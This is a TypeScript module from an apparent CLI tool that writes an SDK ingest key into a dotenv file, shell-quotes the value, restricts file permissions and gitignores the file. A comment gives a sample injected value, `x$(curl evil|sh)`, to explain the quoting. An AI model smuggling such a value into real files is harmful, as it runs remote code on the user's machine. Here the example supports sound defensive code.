/**
 * Env-file upserts (`.env.local` or `.env`). Sets a single key without
 * clobbering the rest of the file, and makes sure the file is gitignored (the
 * CLI never commits — it only guards the human from committing a secret).
 */
import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, readFileSync, writeFileSync } from "node:fs";
import path from "node:path";

/** True when `file` is tracked by git in `cwd` (so a later `.gitignore` edit can't untrack it). */
const isGitTracked = (cwd: string, file: string): boolean => {
  try {
    return spawnSync("git", ["ls-files", "--error-unmatch", file], { cwd, stdio: "ignore" }).status === 0;
  } catch {
    return false;
  }
};

/** The env var the SDK ingest key is written under in `.env.local` (read by the `@glassray/tracing` exporter). */
export const INGEST_KEY_ENV_VAR = "GLASSRAY_API_KEY";

/** Result of an env upsert, for the caller's status line. */
export interface EnvUpsertResult {
  /** Absolute path written. */
  file: string;
  /** True when the key already had this exact value (no write needed). */
  unchanged: boolean;
  /** True when `.env.local` was added to `.gitignore` as part of this call. */
  gitignoreUpdated: boolean;
}

/**
 * Render a value for a dotenv line. A value outside a conservative safe set is
 * single-quoted so a hostile server-supplied value (e.g. an ingest key like
 * `x$(curl evil|sh)`) can't inject shell expansion when the file is later
 * `source`d — single quotes suppress ALL expansion, and an embedded single quote
 * is escaped with the `'\''` idiom. Simple key-shaped values stay unquoted.
 */
const formatValue = (value: string): string =>
  /^[A-Za-z0-9_./:@%+=-]+$/.test(value) ? value : `'${value.replace(/'/g, "'\\''")}'`;

/**
 * Which env file to write the ingest secret into: an existing UNTRACKED
 * `.env.local`, else an existing UNTRACKED `.env`, else a fresh `.env.local`
 * (the gitignored convention). A git-tracked dotenv file is NEVER chosen — a
 * committed/staged secret can't be un-tracked by the later `.gitignore` add, so
 * it would leak. Returns `null` when the only candidate is a tracked `.env.local`
 * (no safe target): the caller must surface the key instead of auto-writing it.
 */
export const detectEnvFile = (cwd: string): string | null => {
  const localExists = existsSync(path.join(cwd, ".env.local"));
  if (localExists && !isGitTracked(cwd, ".env.local")) return ".env.local";
  if (existsSync(path.join(cwd, ".env")) && !isGitTracked(cwd, ".env")) return ".env";
  // Reached only when `.env.local` is absent (→ create fresh, safe) or exists but
  // is git-tracked (→ no safe target).
  return localExists ? null : ".env.local";
};

/** Upsert `KEY=value` into `<cwd>/<filename>` (default `.env.local`), preserving other lines; ensures it's gitignored. */
export const upsertEnvFile = (
  cwd: string,
  key: string,
  value: string,
  filename = ".env.local",
): EnvUpsertResult => {
  const file = path.join(cwd, filename);
  const line = `${key}=${formatValue(value)}`;
  let unchanged = false;

  let lines: string[] = [];
  if (existsSync(file)) {
    lines = readFileSync(file, "utf8").split(/\r?\n/);
    const idx = lines.findIndex((l) => {
      const t = l.trim();
      return t.startsWith(`${key}=`) || t.startsWith(`export ${key}=`);
    });
    if (idx >= 0) {
      unchanged = lines[idx] === line;
      lines[idx] = line;
    } else {
      // Drop a single trailing empty line so we don't accrete blank lines on re-run.
      if (lines.length > 0 && lines[lines.length - 1] === "") lines.pop();
      lines.push(line);
    }
  } else {
    lines = [line];
  }

  if (!unchanged) {
    // The file holds an ingest secret — lock it to the owner (0600), matching the
    // credential store; `mode` only applies on create, so chmod covers a pre-existing file.
    writeFileSync(file, `${lines.join("\n").replace(/\n*$/, "")}\n`, { mode: 0o600 });
    chmodSync(file, 0o600);
  }
  const gitignoreUpdated = ensureGitignored(cwd, filename);
  return { file, unchanged, gitignoreUpdated };
};

/** Append `entry` to `<cwd>/.gitignore` if absent. Returns whether the file was changed. */
export const ensureGitignored = (cwd: string, entry: string): boolean => {
  const file = path.join(cwd, ".gitignore");
  let existing = "";
  if (existsSync(file)) existing = readFileSync(file, "utf8");
  const has = existing
    .split(/\r?\n/)
    .map((l) => l.trim())
    .some((l) => l === entry || l === `/${entry}`);
  if (has) return false;
  const prefix = existing === "" || existing.endsWith("\n") ? existing : `${existing}\n`;
  writeFileSync(file, `${prefix}${entry}\n`);
  return true;
};
